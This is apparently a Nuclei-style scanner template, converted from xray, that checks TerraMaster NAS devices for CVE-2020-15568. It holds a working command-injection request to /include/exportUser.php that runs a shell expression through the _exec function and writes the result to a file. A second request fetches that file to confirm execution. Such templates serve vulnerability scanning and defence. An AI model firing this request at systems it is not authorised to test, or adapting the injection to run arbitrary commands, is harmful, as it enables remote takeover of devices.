id: poc-yaml-terramaster-cve-2020-15568

info:
  name: poc-yaml-terramaster-cve-2020-15568
  author: albertchang
  severity: critical
  tags: xray-converted,cve-2020-15568,ct-147855
  reference:
    - https://ssd-disclosure.com/ssd-advisory-terramaster-os-exportuser-php-remote-code-execution/

http:
  - raw:
      - |
        GET /include/exportUser.php?type=3&cla=application&func=_exec&opt=(expr%20{{rand_int(1000, 9999)}}%20%2B%20{{rand_int(1000, 9999)}})%3E{{rand_base(8)}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /include/{{rand_base(8)}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200